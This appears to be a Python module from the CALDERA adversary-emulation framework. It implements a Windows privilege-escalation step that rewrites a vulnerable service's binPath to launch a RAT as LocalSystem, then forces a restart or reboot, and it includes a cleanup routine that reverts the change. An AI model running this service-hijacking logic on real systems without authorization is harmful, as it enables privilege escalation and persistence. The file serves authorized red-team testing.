import logging
import asyncio

from plugins.adversary.app.commands import cmd, sc, command
from plugins.adversary.app.operation.operation import Step, OPHost, OPRat, OPVar, OPService
from plugins.adversary.app.commands.errors import *
from plugins.adversary.app.commands import parsers

log = logging.getLogger(__name__)


class ServiceManipulateBinPathScLocal(Step):
    """
    Description:
        This step hijacks a vulnerable service by modifying the target path associated with the binary to point
        to a copy of the RAT. Once this is completed, CALDERA runs the service, producing an elevated RAT.
    Requirements:
        Require a non-elevated RAT, and enumeration of a modifiable service path on the target machine (possible
        result of running GetPriveEscSvcInfo).
    """
    attack_mapping = [('T1058', 'Privilege Escalation'), ('T1058', 'Persistence'), ('T1035', 'Execution'),
                      ('T1106', 'Execution')]
    display_name = "service_manipulation(sc binpath)"
    summary = "Abuse service permissions to spawn an elevated rat by changing a service's binPath"

    preconditions = [("host", OPHost),
                     ("rat", OPRat({"elevated": False,
                                     "host": OPVar("host")})),
                     ("service", OPService({'vulnerability': 'bin_path',
                                            'host': OPVar("host"),
                                            'revert_command': "",
                                            'can_restart': True,
                                            'user_context': OPVar("rat.username")}))]

    postconditions = [("rat_g", OPRat({"host": OPVar("host"), "elevated": True,
                                         "executable": OPVar("rat.executable")})),
                      ("service_g", OPService)]

    @staticmethod
    def description(rat, service, host):
        return "Attempting to change the binPath of {} on {} to our rat".format(service.name, host.hostname)

    @staticmethod
    async def simulate(operation, rat, service, host, rat_g, service_g):
        return True

    @staticmethod
    async def action(operation, rat, service, host, rat_g, service_g):
        try:
            # if the service is running, stop it first so we can modify the binPath
            state = await operation.execute_shell_command(rat, *sc.query(service.name))
            if state['state'] == "RUNNING":
                try:
                    await operation.execute_shell_command(rat, *sc.stop(service.name))
                    await asyncio.sleep(2)  # make sure the service has time to properly stop
                except ServiceNotStartedError:
                    pass  # this is fine in our case if it isn't already running
            # actually modify the binPath and the start_name if needed
            await operation.execute_shell_command(rat, *sc.config(name=service.name, bin_path=rat.executable,
                                                                  start_name="LocalSystem"))
            revert_command = "sc config " + service.name + " binpath= \"" + service.bin_path + "\" obj= " + service.service_start_name
            if service.can_restart is True:
                await operation.execute_shell_command(rat, *sc.start(service.name))
            else:
                await operation.execute_shell_command(rat, *cmd.shutdown(reboot=True, delay=0, force=True))
            await rat_g()
            await service_g({'name': service.name,  # update our service with what we modified
                             'host': service.host,
                             'vulnerability': service.vulnerability,
                             'revert_command': revert_command})
        except AccessDeniedError:
            # something went wrong, not actually vulnerable for some reason
            await service_g({'name': service.name,
                             'host': service.host,
                             'vulnerability': service.vulnerability,
                             'revert_command': 'echo \"Not Vulnerable\"'})
            return False
        return True

    @staticmethod
    async def cleanup(cleaner, host, service):
        # stop the service before we can modify it
        try:
            await cleaner.run_on_agent(host, *sc.stop(service['name']))
        except ServiceNotStartedError:
            pass
        except CantControlServiceError:
            log.debug("Can't stop {} on {}".format(service.name, service.host))
        # now fix the service back to what it was before
        await cleaner.run_on_agent(host, command.CommandLine(service['revert_command']), parsers.sc.config)
        return True
